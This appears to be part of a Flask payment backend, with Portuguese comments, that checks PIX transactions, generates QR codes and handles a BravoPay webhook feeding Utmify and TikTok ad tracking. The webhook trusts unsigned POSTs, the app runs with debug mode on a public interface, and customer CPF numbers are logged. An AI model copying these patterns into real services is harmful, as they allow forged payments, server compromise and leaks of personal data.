@app.route('/check-payment')
def check_payment(transaction_id=None):
    """Verifica o status de uma transação PIX no gateway ativo e notifica Utmify instantaneamente"""
    try:
        if not transaction_id:
            transaction_id = request.args.get('transaction_id') or request.args.get('id')
        if not transaction_id:
            return jsonify({'success': False, 'error': 'transaction_id não informado'}), 400

        app.logger.info(f"[PAYMENT_STATUS] Verificando status: {transaction_id}")
        provider, api = get_active_payment_gateway()

        status_result = api.get_transaction(transaction_id)
        app.logger.info(f"[PAYMENT_STATUS] Status ({provider}): {status_result}")

        status = str(status_result.get('status', '')).lower()
        if status_result.get('success') and status in ['approved', 'paid', 'pago']:
            app.logger.info(f"[PAYMENT_STATUS] PAGAMENTO CONFIRMADO! {transaction_id}")
            
            # Utmify — Pedido Pago (paid)
            try:
                utmify_api.track_paid(order_id=transaction_id)
            except Exception as utm_err:
                app.logger.warning(f"[UTMIFY] Falha no track_paid polling: {utm_err}")

            # TikTok CAPI — Purchase
            try:
                send_purchase(
                    event_id=f'purchase_{transaction_id}',
                    value=148.37,
                    ip=request.headers.get('X-Forwarded-For', request.remote_addr or ''),
                    user_agent=request.headers.get('User-Agent', ''),
                    page_url=request.host_url + 'atendimento',
                )
            except Exception as capi_err:
                app.logger.warning(f"[TIKTOK_CAPI] Purchase polling falhou: {capi_err}")

            return jsonify({
                'success': True,
                'status': 'approved',
                'paid': True,
                'transaction_id': transaction_id,
                'redirect_to_negociacao': True
            })

        return jsonify(status_result)

    except Exception as e:
        app.logger.error(f"[PAYMENT_STATUS] Erro: {e}")
        return jsonify({
            'success': False,
            'error': str(e),
            'status': 'error'
        }), 500

@app.route('/generate-qrcode')
def generate_qrcode():
    pix_code = request.args.get('data', '')
    if not pix_code:
        return 'No data provided', 400

    try:
        qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4)
        qr.add_data(pix_code)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")

        img_buffer = io.BytesIO()
        img.save(img_buffer, format='PNG')
        img_buffer.seek(0)

        response = send_file(img_buffer, mimetype='image/png')
        response.headers['Cache-Control'] = 'public, max-age=3600'
        return response
    except Exception as e:
        app.logger.error(f"Erro ao gerar qrcode endpoint: {e}")
        return 'Error generating QR code', 500

@app.route('/webhook/bravopay', methods=['POST'])
def bravopay_webhook():
    """Webhook para receber notificações de pagamento da BravoPay"""
    try:
        data = request.get_json() or {}
        app.logger.info(f"[BRAVOPAY_WEBHOOK] Notificação recebida: {data}")

        event_name = data.get('event', '')
        tx_data = data.get('data') if isinstance(data.get('data'), dict) else data

        transaction_id = tx_data.get('id', '')
        status_raw = str(tx_data.get('status', '')).upper()
        amount_cents = tx_data.get('amount_cents', 0)
        amount = amount_cents / 100.0 if amount_cents else 148.37
        customer = tx_data.get('customer') or {}
        cpf = customer.get('cpf', '')

        app.logger.info(f"[BRAVOPAY_WEBHOOK] ID={transaction_id}, Evento={event_name}, Status={status_raw}, Valor=R${amount:.2f}")

        if status_raw == 'PAID' or event_name == 'transaction.paid':
            app.logger.info(f"[BRAVOPAY_WEBHOOK] PAGAMENTO CONFIRMADO - ID: {transaction_id}")
            
            # Utmify — Pedido Pago (paid)
            try:
                utmify_api.track_paid(
                    order_id=transaction_id,
                    amount=amount,
                    customer={'cpf': cpf}
                )
            except Exception as utm_err:
                app.logger.warning(f"[UTMIFY] Falha no track_paid webhook: {utm_err}")

            try:
                send_purchase(
                    event_id=f'purchase_{transaction_id}',
                    value=amount,
                    cpf=cpf,
                    ip=request.headers.get('X-Forwarded-For', request.remote_addr or ''),
                    user_agent=request.headers.get('User-Agent', ''),
                    page_url=request.host_url + 'atendimento',
                )
            except Exception as capi_err:
                app.logger.warning(f"[TIKTOK_CAPI] Purchase webhook falhou: {capi_err}")

        return jsonify({'success': True, 'received': True}), 200

    except Exception as e:
        app.logger.error(f"[BRAVOPAY_WEBHOOK] Erro webhook BravoPay: {e}")
        return jsonify({'success': True}), 200

@app.route('/webhook/hurionpay', methods=['POST'])
@app.route('/webhook/flevopay', methods=['POST'])
@app.route('/webhook/ghostspay', methods=['POST'])
def legacy_webhook():
    """Compatibilidade para webhooks legados"""
    return jsonify({'success': True, 'received': True}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
